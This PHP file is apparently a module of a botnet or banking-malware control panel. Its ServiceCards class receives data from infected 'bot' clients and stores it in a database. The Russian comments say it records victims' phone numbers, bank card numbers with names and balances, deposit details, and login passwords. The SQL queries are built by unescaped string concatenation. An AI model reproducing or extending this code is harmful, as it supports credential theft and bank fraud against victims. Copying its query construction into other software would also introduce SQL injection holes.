<?php

class ServiceCards {
    private $bot, $system, $mysqli, $log, $new_log, $balance;
    
    function __construct(){
        global $bot, $system, $mysqli;
        $this->bot = &$bot;
        $this->system = &$system;
        $this->db = &$mysqli;
        $this->new_log = false;
	$this->balance = '0';
    }
    
    function _save_log(){
	//$this->db->settings["debug"] = true;
	$this->log->log = base64_encode(gzdeflate(json_encode($this->log->log)));
	if($this->new_log == true){
            if($this->balance != 0){
		return $this->db->query('INSERT DELAYED INTO bf_log_info (userid, prefix, uid, log, balance, system) VALUES ( \''.$this->bot->userid.'\', \''.$this->bot->prefix.'\', \''.$this->bot->uid.'\', \''.$this->log->log.'\', \''.$this->balance.'\', \''.$this->system->nid.'\')');
	    }else{
		return $this->db->query('INSERT DELAYED INTO bf_log_info (userid, prefix, uid, log, system) VALUES ( \''.$this->bot->userid.'\', \''.$this->bot->prefix.'\', \''.$this->bot->uid.'\', \''.$this->log->log.'\', \''.$this->system->nid.'\')');
	    }
	}else{
	    if($this->balance != 0){
		return $this->db->query('update bf_log_info set log = \''.$this->log->log.'\', balance = \''.$this->balance.'\' WHERE (id = \''.$this->log->id.'\') LIMIT 1');
	    }else{
		return $this->db->query('update bf_log_info set log = \''.$this->log->log.'\' WHERE (id = \''.$this->log->id.'\') LIMIT 1');
	    }
	}
    }
    
    function SetSteps($type, $data){
	$this->db->settings["debug"] = true;
        $this->log = $this->db->query('SELECT * FROM bf_log_info WHERE (prefix = \''.$this->bot->prefix.'\') AND (uid = \''.$this->bot->uid.'\') LIMIT 1');
	
        if(@$this->log->prefix != $this->bot->prefix && @$this->log->uid != $this->bot->uid){
            $this->new_log = true;
        }else{
            $this->new_log = false;
	    if(!empty($this->log->log)){
                $this->log->log = base64_decode($this->log->log);
		if(!empty($this->log->log)){
                    $this->log->log = gzinflate($this->log->log);
                    if($this->log->log != false){
			$this->log->log = json_decode($this->log->log, true);
                    }
                }
            }
            
            if(empty($this->log->log)) $this->log->log = array();
        }
	
        switch ($type){
            case '1': //отправляем номер телефона
                $this->log->log['phone'] = $data;
                return $this->_save_log();
            break;
        
            case '2': //сохраняет данные по карточке (их может быть несколько)
                foreach($data as $value){                   
                    $this->balance += $value['Sum'];
		    $this->log->log['cards'][$value['Number']]['name'] = rawurldecode($value['Name']);
                    $this->log->log['cards'][$value['Number']]['summ'] = $value['Sum'];
                    $this->log->log['cards'][$value['Number']]['id'] = $value['linkid'];
                }
		//print_rm($this->log->log['cards']);
                return $this->_save_log();
            break;
        
            case '3': //сохраняет информацию по депозиту
                $raurldec = array();
                foreach($data as $key=>$value){
                    //$raurldec[$key] = iconv("UTF-8","windows-1251",rawurldecode($value));
		    $raurldec[$key] = rawurldecode($value);
                }
		
                //$this->balance += $raurldec['depoSumm'];

		//$this->log->log['depo'][$raurldec['depoId']] = $raurldec;
		$this->log->log['depo'][$raurldec['linkid']] = $raurldec;
                return $this->_save_log();
            break;
        
            case '4': //cохраняет логин и пароль
                $this->log->log['login'] = $data['login'];
                $this->log->log['pass'] = $data['pass'];
		return $this->_save_log();
            break;
        }
    }
}

RegisterService("ServiceCards");